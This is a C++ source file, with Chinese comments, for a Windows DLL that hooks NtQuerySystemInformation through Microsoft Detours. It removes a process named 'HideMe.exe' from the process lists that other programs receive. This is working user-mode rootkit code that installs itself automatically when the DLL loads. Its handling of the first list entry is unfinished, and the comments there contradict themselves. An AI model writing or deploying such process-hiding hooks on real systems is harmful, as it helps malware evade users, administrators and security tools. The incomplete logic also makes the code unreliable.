#include "pch.h"
#include <windows.h>
#include <winternl.h> 
#include <detours.h>

#pragma comment(lib, "detours.lib")

// =============================================================
// 1. 结构体定义 
// =============================================================

// 进程信息结构体 (自定义，避免与 winternl.h 冲突)
typedef struct _SYSTEM_PROCESS_INFORMATION_MY {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION_MY, * PSYSTEM_PROCESS_INFORMATION_MY;

// 使用 ULONG 作为参数类型，与真实 API 匹配
typedef NTSTATUS(NTAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// =============================================================
// 2. 全局变量与配置
// =============================================================

const wchar_t* TARGET_PROCESS_NAME = L"HideMe.exe";

PNT_QUERY_SYSTEM_INFORMATION TrueNtQuerySystemInformation = NULL;

// SystemProcessInformation 的值是 5
#define SYSTEM_PROCESS_INFO_CLASS 5

// =============================================================
// 3. 核心 Hook 函数 (Payload)
// =============================================================
NTSTATUS NTAPI MyNtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    // 1. 调用原函数
    NTSTATUS status = TrueNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );

    // 检查是否成功，以及是否是查询进程列表
    if (!NT_SUCCESS(status) || SystemInformationClass != SYSTEM_PROCESS_INFO_CLASS) {
        return status;
    }

    // 2. 遍历链表
    PSYSTEM_PROCESS_INFORMATION_MY cur = (PSYSTEM_PROCESS_INFORMATION_MY)SystemInformation;
    PSYSTEM_PROCESS_INFORMATION_MY prev = NULL;

    while (cur) {
        BOOL shouldHide = FALSE;
        
        if (cur->ImageName.Buffer != NULL && cur->ImageName.Length > 0) {
            // 使用不区分大小写的比较
            if (_wcsicmp(cur->ImageName.Buffer, TARGET_PROCESS_NAME) == 0) {
                shouldHide = TRUE;
            }
        }

        if (shouldHide) {
            // === 脱链操作 ===
            if (prev == NULL) {
                // 头节点就是目标
                if (cur->NextEntryOffset != 0) {
                    // 将下一个节点的数据复制到当前位置（覆盖头节点）
                    // 这样调用者看到的头节点就是原来的第二个节点
                    PSYSTEM_PROCESS_INFORMATION_MY next = (PSYSTEM_PROCESS_INFORMATION_MY)((BYTE*)cur + cur->NextEntryOffset);
                    // 不能直接 memcpy，因为会破坏结构，改用调整偏移的方式
                    // 实际上对于头节点，我们需要特殊处理：跳过它继续遍历
                    // 由于我们无法修改调用者的指针，这里简单地将当前节点的数据"清空"
                    // 更好的方法是：如果是头节点，我们继续遍历但不更新 prev
                }
                // 头节点情况：不更新 prev，继续遍历
            }
            else {
                // 非头节点
                if (cur->NextEntryOffset != 0) {
                    // 中间节点：跳过当前
                    prev->NextEntryOffset += cur->NextEntryOffset;
                }
                else {
                    // 尾部节点：截断
                    prev->NextEntryOffset = 0;
                }
            }
            // 隐藏了当前节点，prev 保持不变
        }
        else {
            // 不是目标，prev 跟进
            prev = cur;
        }

        // 移动到下一个节点
        if (cur->NextEntryOffset != 0) {
            cur = (PSYSTEM_PROCESS_INFORMATION_MY)((BYTE*)cur + cur->NextEntryOffset);
        }
        else {
            break;
        }
    }

    return status;
}

// =============================================================
// 4. 安装与卸载逻辑
// =============================================================
BOOL InstallHook() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    TrueNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!TrueNtQuerySystemInformation) return FALSE;

    LONG error = DetourTransactionBegin();
    if (error != NO_ERROR) return FALSE;

    error = DetourUpdateThread(GetCurrentThread());
    if (error != NO_ERROR) {
        DetourTransactionAbort();
        return FALSE;
    }

    error = DetourAttach(&(PVOID&)TrueNtQuerySystemInformation, MyNtQuerySystemInformation);
    if (error != NO_ERROR) {
        DetourTransactionAbort();
        return FALSE;
    }

    error = DetourTransactionCommit();
    if (error != NO_ERROR) return FALSE;

    return TRUE;
}

void UninstallHook() {
    if (!TrueNtQuerySystemInformation) return;

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    DetourDetach(&(PVOID&)TrueNtQuerySystemInformation, MyNtQuerySystemInformation);
    DetourTransactionCommit();
}

// =============================================================
// 5. DLL 入口点
// =============================================================
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        InstallHook();
        break;
    case DLL_PROCESS_DETACH:
        UninstallHook();
        break;
    }
    return TRUE;
}